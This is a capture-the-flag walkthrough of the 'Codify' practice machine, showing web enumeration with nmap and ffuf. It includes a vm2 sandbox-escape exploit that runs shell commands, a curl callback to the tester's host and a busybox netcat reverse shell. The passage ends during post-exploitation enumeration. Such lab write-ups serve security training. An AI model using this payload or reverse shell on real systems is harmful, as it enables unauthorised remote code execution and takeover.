## Description
Codify is an easy Linux machine that features a web application that allows users to test `Node.js` code. The application uses a vulnerable `vm2` library, which is leveraged to gain remote code execution. Enumerating the target reveals a `SQLite` database containing a hash which, once cracked, yields `SSH` access to the box. Finally, a vulnerable `Bash` script can be run with elevated privileges to reveal the `root` user's password, leading to privileged access to the machine.
## Information gathering
Let's start by looking at the open ports with a very basic nmap command:
```
$nmap -p- 10.129.36.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 19:08 CET
Nmap scan report for 10.129.36.69
Host is up (0.020s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```
We have, as usual, an SSH server on port 22. There is a web server on the standard port 80. More surprising, something is running on the port 3000. I do not know this port. Let's run the common nmap scripts to get more information:
```
$nmap -p22,80,3000 -sC -sV 10.129.36.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 19:11 CET
Nmap scan report for 10.129.36.69
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
```
We have 2 web servers. One running with Apache on port 80 and one running with Node.js on port 3000. To get more information on the Apache server, I will set the domain name `codify.htb` in my `/etc/hosts` file, and then run nmap again:
```
$nmap -p22,80,3000 -sC -sV 10.129.36.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 19:14 CET
Nmap scan report for codify.htb (10.129.36.69)
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Codify
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```
Well, the script did not get much more information. Let's look at the web sites.

The Apache server is a server which provides a way to run Node.js code easily. There is an editor where you can write some JavaScript code and execute it. According to the page "About us", the library `vm2` is used in order to sandbox Javascript code. There is a page "Limitations" that explaining that the modules `child_process` and `fs` cannot be imported, and that only a limited set of modules can be imported.
The server running on port 3000 seems to provide the exact same features.

In the `/editor` page, we can see in the Javascript code of the page that the endpoint `/run` is called with a POST request to send to Javascript code to the server:
```
  <script>
    function runCode() {
      const code = document.getElementById('code').value;
      const encodedCode = btoa(code);
      fetch('/run', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ code: encodedCode })
      })
        .then(response => response.json())
        .then(data => {
          const output = document.getElementById('output');
          if (data.error) {
            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: red;">Error: ${data.error}</textarea>`;
          } else {
            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: green;">${data.output}</textarea>`;
          }
        })
        .catch(error => {
          console.error(error);
          const output = document.getElementById('output');
          output.innerHTML = `<div style="color: red;">Error: ${error.message}</div>`;
        });
    }
  </script>
```
We can also see that the code is encoded in Base64 before being sent to the server.

On both servers, we will try to find for hidden pages:
```
$ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://codify.htb/FUZZ -ic -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://codify.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 2269, Words: 465, Lines: 39, Duration: 63ms]
| URL | http://codify.htb/
    * FUZZ: 

[Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 63ms]
| URL | http://codify.htb/about
    * FUZZ: about

[Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 20ms]
| URL | http://codify.htb/About
    * FUZZ: About

[Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 20ms]
| URL | http://codify.htb/editor
    * FUZZ: editor

[Status: 200, Size: 2269, Words: 465, Lines: 39, Duration: 61ms]
| URL | http://codify.htb/
    * FUZZ: 

[Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 49ms]
| URL | http://codify.htb/Editor
    * FUZZ: Editor

[Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 48ms]
| URL | http://codify.htb/ABOUT
    * FUZZ: ABOUT

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 36ms]
| URL | http://codify.htb/server-status
    * FUZZ: server-status

[Status: 200, Size: 2665, Words: 585, Lines: 62, Duration: 30ms]
| URL | http://codify.htb/limitations
    * FUZZ: limitations

:: Progress: [1273820/1273820] :: Job [1/1] :: 1941 req/sec :: Duration: [0:15:13] :: Errors: 0 ::

$ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://codify.htb:3000/FUZZ -ic -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://codify.htb:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 29ms]
| URL | http://codify.htb:3000/about
    * FUZZ: about

[Status: 200, Size: 2269, Words: 465, Lines: 39, Duration: 31ms]
| URL | http://codify.htb:3000/
    * FUZZ: 

[Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 25ms]
| URL | http://codify.htb:3000/About
    * FUZZ: About

[Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 20ms]
| URL | http://codify.htb:3000/editor
    * FUZZ: editor

[Status: 200, Size: 2269, Words: 465, Lines: 39, Duration: 21ms]
| URL | http://codify.htb:3000/
    * FUZZ: 

[Status: 200, Size: 3123, Words: 739, Lines: 119, Duration: 20ms]
| URL | http://codify.htb:3000/Editor
    * FUZZ: Editor

[Status: 200, Size: 2921, Words: 527, Lines: 51, Duration: 21ms]
| URL | http://codify.htb:3000/ABOUT
    * FUZZ: ABOUT

[Status: 200, Size: 2665, Words: 585, Lines: 62, Duration: 24ms]
| URL | http://codify.htb:3000/limitations
    * FUZZ: limitations

:: Progress: [1273820/1273820] :: Job [1/1] :: 2000 req/sec :: Duration: [0:11:58] :: Errors: 0 ::
```
It seems there are no additional pages in both servers.

Let's also look for hidden virtual hosts:
```
$ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://codify.htb/ -H 'Host: FUZZ.codify.htb' -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://codify.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.codify.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1562 req/sec :: Duration: [0:01:16] :: Errors: 0 ::

$ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://codify.htb:3000/ -H 'Host: FUZZ.codify.htb' -fs 2269

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://codify.htb:3000/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.codify.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 2269
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 819 req/sec :: Duration: [0:02:47] :: Errors: 0 ::
```
On port 80, the server redirects to `codify.htb`, this is why I filter 301 response code. And on the port 3000, all virtual hosts have the same content, that is why I filtered by the size of the main page (2269 B). But we have found no additional virtual hosts.

Finally, let's check if the `/run` endpoint can have hidden parameters:
```
$ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://codify.htb/run -X POST -d '{"FUZZ":"something"}' -H 'Content-Type: application/json' -fs 1172

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://codify.htb/run
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"FUZZ":"something"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 1172
________________________________________________

[Status: 200, Size: 39, Words: 4, Lines: 1, Duration: 61ms]
    * FUZZ: code

:: Progress: [6453/6453] :: Job [1/1] :: 400 req/sec :: Duration: [0:00:16] :: Errors: 0 ::

$ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://codify.htb/run -X POST -d '{"code":"Y29uc29sZS5sb2coJ0hlbGxvJyk7","FUZZ":"something"}' -H 'Content-Type: application/json' -fs 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://codify.htb/run
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"code":"Y29uc29sZS5sb2coJ0hlbGxvJyk7","FUZZ":"something"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 22
________________________________________________

[Status: 200, Size: 39, Words: 4, Lines: 1, Duration: 20ms]
    * FUZZ: code

:: Progress: [6453/6453] :: Job [1/1] :: 87 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```
Only `code` seems to be accepted.

Let's look now at the error pages. If you try to access to an unexisting page, on both servers, you get a message like:
```
Cannot GET /bad
```

If you run an empty POST request to the `/run` endpoint, you get this error:
```
$curl http://codify.htb:3000/run -X POST
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received undefined<br> &nbsp; &nbsp;at new NodeError (node:internal/errors:405:5)<br> &nbsp; &nbsp;at Function.from (node:buffer:333:9)<br> &nbsp; &nbsp;at /var/www/editor/index.js:27:22<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/editor/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/www/editor/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/www/editor/node_modules/express/lib/router/route.js:114:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/www/editor/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/www/editor/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/var/www/editor/node_modules/express/lib/router/index.js:346:12)<br> &nbsp; &nbsp;at next (/var/www/editor/node_modules/express/lib/router/index.js:280:10)</pre>
</body>
</html>
```
This is a Node.js error with a stacktrace. We can see that the `code` parameter can accept other types than a `String`.
If the `code` parameter is not Base64 encoded, we have an empty output:
```
$curl http://codify.htb:3000/run -X POST -d '{"code":"&é$()"}' -H 'Content-Type: application/json'
{"output":""}
```
Finally, if the given code does not represent JavaScript code, we have the error from the engine, I guess:
```
$curl http://codify.htb:3000/run -X POST -d '{"code":"aaaaaaaa"}' -H 'Content-Type: application/json'
{"error":"Invalid or unexpected token"}
```
## Vulnerability assessment
The most promising vulnerability seems to be the `vm2` library. Indeed, if we go in the [GitHub page](https://github.com/patriksimek/vm2) of the library, we can read:
```
TL;DR The library contains critical security issues and should not be used for production! The maintenance of the project has been discontinued. Consider migrating your code to isolated-vm.
```
## Exploitation
We can find an exploit for `vm2` to escape from the sandbox on [Exploit Database](https://www.exploit-db.com/exploits/51898):
```
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}

try {
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };

    const proxiedErr = new Proxy({}, handler);

    throw proxiedErr;
} catch ({ constructor: c }) {
    const childProcess = c.constructor('return process')().mainModule.require('child_process');
    childProcess.execSync('${command}');
}
```
We just need to change the command to execute what we want. If we try with `whoami`, we have an empty output. Is my code really executed? To check that, I setup an HTTP server on my machine and change the command to `curl http://10.10.14.91:8080/`. After running the code, I can see that I had a request to my server:
```
$python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.36.69 - - [24/Mar/2024 09:56:32] "GET / HTTP/1.1" 200 -
```
Let's get a reverse shell. I used a command without redirect because there usually are some issues when run through a framework. I prefered to use the busybox command: `busybox nc 10.10.14.91 4444 -e sh`. And I got my reverse shell:
```
$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.91] from (UNKNOWN) [10.129.36.69] 43186
whoami
svc
```
Unfortunately, this is not enough to get the flag:
```
svc@codify:~$ ls /home
joshua  svc
svc@codify:~$ ls /home/svc
svc@codify:~$ ls /home/joshua/
ls: cannot open directory '/home/joshua/': Permission denied
```
## Machine enumeration
Let's first look at the running processes:
```
svc@codify:~$ ps aux | grep svc
svc         1247  0.1  1.6 650856 67248 ?        Ssl  Mar23   1:47 PM2 v5.3.0: God Daemon (/home/svc/.pm2)
svc         1344  0.2  1.7 882976 70532 ?        Sl   Mar23   2:17 node /var/www/editor/index.js
svc         1346  0.3  1.8 949460 73060 ?        Sl   Mar23   2:59 node /var/www/editor/index.js
svc         1415  0.2  1.7 948016 71320 ?        Sl   Mar23   2:05 node /var/www/editor/index.js
svc         1418  0.3  1.7 948320 71220 ?        Sl   Mar23   3:05 node /var/www/editor/index.js
svc         1438  0.2  1.8 950320 74276 ?        Sl   Mar23   2:42 node /var/www/editor/index.js
svc         1442  0.6  1.8 949740 72532 ?        Sl   Mar23   6:13 node /var/www/editor/index.js
svc         1465  0.2  2.0 1016560 81520 ?       Sl   Mar23   2:08 node /var/www/editor/index.js
svc         1515  0.3  1.8 752328 71532 ?        Sl   Mar23   2:54 node /var/www/editor/index.js
svc         1534  0.2  1.9 953384 77352 ?        Sl   Mar23   2:34 node /var/www/editor/index.js
svc         1854  0.2  1.7 817756 71224 ?        Sl   Mar23   2:09 node /var/www/editor/index.js
svc        10403  0.0  0.0   2888   996 ?        S    09:01   0:00 /bin/sh -c busybox nc 10.10.14.91 4444 -e sh
svc        10404  0.0  0.0   2456     4 ?        S    09:01   0:00 sh
svc        10406  0.0  0.2  17348  9160 ?        S    09:03   0:00 python3 -c import pty; pty.spawn("/bin/bash")
svc        10407  0.0  0.1   8724  5584 pts/0    Ss   09:03   0:00 /bin/bash
svc        10454  0.0  0.0  10068  1584 pts/0    R+   09:13   0:00 ps aux
svc        10455  0.0  0.0   6476  2296 pts/0    S+   09:13   0:00 grep --color=auto svc
```
We can see that there are multiple node processes, not only the one we used to get the reverse shell. We can look at the full command line:
```
$ ps -eaux | grep svc | grep node
svc         1344  0.2  1.7 882976 70312 ?        Sl   Mar23   2:18 node /var/www/editor/index.js SILENT=true PM2_HOME=/home/svc/.pm2 LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin PIDFILE=/home/svc/.pm2/pm2.pid HOME=/home/svc LOGNAME=svc USER=svc SHELL=/bin/bash INVOCATION_ID=9ac41fa116664270bf71e0fdf28826ba JOURNAL_STREAM=8:32113 SYSTEMD_EXEC_PID=1131 PM2_USAGE=CLI pm2_env={"kill_retry_time":100,"windowsHide":true,"username":"svc","treekill":true,"automation":true,"pmx":true,"instance_var":"NODE_APP_INSTANCE","watch":false,"autorestart":true,"vizion":true,"env":{"SHELL":"/bin/bash","PWD":"/home/svc","LOGNAME":"svc","XDG_SESSION_TYPE":"tty","MOTD_SHOWN":"pam","HOME":"/home/svc","LANG":"en_US.UTF-8","LS_COLORS":"rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:","SSH_CONNECTION":"192.168.1.5 53898 192.168.1.3 22","LESSCLOSE":"/usr/bin/lesspipe %s %s","XDG_SESSION_CLASS":"user","TERM":"tmux-256color","LESSOPEN":"| /usr/bin/lesspipe %s","USER":"svc","SHLVL":"1","XDG_SESSION_ID":"1","XDG_RUNTIME_DIR":"/run/user/1001","SSH_CLIENT":"192.168.1.5 53898 22","XDG_DATA_DIRS":"/usr/local/share:/usr/share:/var/lib/snapd/desktop","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin","DBUS_SESSION_BUS_ADDRESS":"unix:path=/run/user/1001/bus","SSH_TTY":"/dev/pts/0","_":"/usr/local/bin/pm2","PM2_USAGE":"CLI","PM2_INTERACTOR_PROCESSING":"true","PM2_HOME":"/home/svc/.pm2","index":{},"unique_id":"ead2ad4f-a167-48b6-8187-816132671347"},"namespace":"default","filter_env":[],"name":"index","node_args":[],"pm_exec_path":"/var/www/editor/index.js","pm_cwd":"/home/svc","exec_interpreter":"node","exec_mode":"cluster_mode","pm_out_log_path":"/home/svc/.pm2/logs/index-out-0.log","pm_err_log_path":"/home/svc/.pm2/logs/index-error-0.log","pm_pid_path":"/home/svc/.pm2/pids/index-0.pid","km_link":false,"vizion_running":false,"NODE_APP_INSTANCE":0,"SHELL":"/bin/bash","PWD":"/home/svc","LOGNAME":"svc","XDG_SESSION_TYPE":"tty","MOTD_SHOWN":"pam","HOME":"/home/svc","LANG":"en_US.UTF-8","LS_COLORS":"rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:","SSH_CONNECTION":"192.168.1.5 53898 192.168.1.3 22","LESSCLOSE":"/usr/bin/lesspipe %s %s","XDG_SESSION_CLASS":"user","TERM":"tmux-256color","LESSOPEN":"| /usr/bin/lesspipe %s","USER":"svc","SHLVL":"1","XDG_SESSION_ID":"1","XDG_RUNTIME_DIR":"/run/user/1001","SSH_CLIENT":"192.168.1.5 53898 22","XDG_DATA_DIRS":"/usr/local/share:/usr/share:/var/lib/snapd/desktop","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin","DBUS_SESSION_BUS_ADDRESS":"unix:path=/run/user/1001/bus","SSH_TTY":"/dev/pts/0","_":"/usr/local/bin/pm2","PM2_USAGE":"CLI","PM2_INTERACTOR_PROCESSING":"true","PM2_HOME":"/home/svc/.pm2","unique_id":"ead2ad4f-a167-48b6-8187-816132671347","status":"launching","pm_uptime":1711217167223,"axm_actions":[],"axm_monitor":{},"axm_options":{},"axm_dynamic":{},"created_at":1694539167612,"restart_time":0,"unstable_restarts":0,"_pm2_version":"5.3.0","versioning":null,"node_version":"18.15.0","pm_id":0} windowsHide=true NODE_UNIQUE_ID=1 NODE_CHANNEL_FD=3 NODE_CHANNEL_SERIALIZATION_MODE=json
```
We can see that `pm2` is used to run the Node applications. And there is the environment variable `SSH_CONNECTION` that lets me think there is another subnet available:
```
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:cf:64 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.36.69/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2974sec preferred_lft 2974sec
    inet6 dead:beef::250:56ff:fe94:cf64/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe94:cf64/64 scope link 
       valid_lft forever preferred_lft forever
3: br-030a38808dbf: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:8e:de:85:81 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-030a38808dbf
       valid_lft forever preferred_lft forever
4: br-5ab86a4e40d0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:53:ce:2d brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-5ab86a4e40d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:aff:fe53:ce2d/64 scope link 
       valid_lft forever preferred_lft forever
5: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:f9:aa:60:21 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
7: vethff50a1f@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-5ab86a4e40d0 state UP group default 
    link/ether 1e:27:ad:34:6f:2f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::1c27:adff:fe34:6f2f/64 scope link 
       valid_lft forever preferred_lft forever
```
There are indeed multiple subnets available but not the one we saw in the `SSH_CONNECTION` variable. We will look at the subnets later in the enumeration, let's continue to look at the processes:
```
svc@codify:~$ ps aux | grep joshua
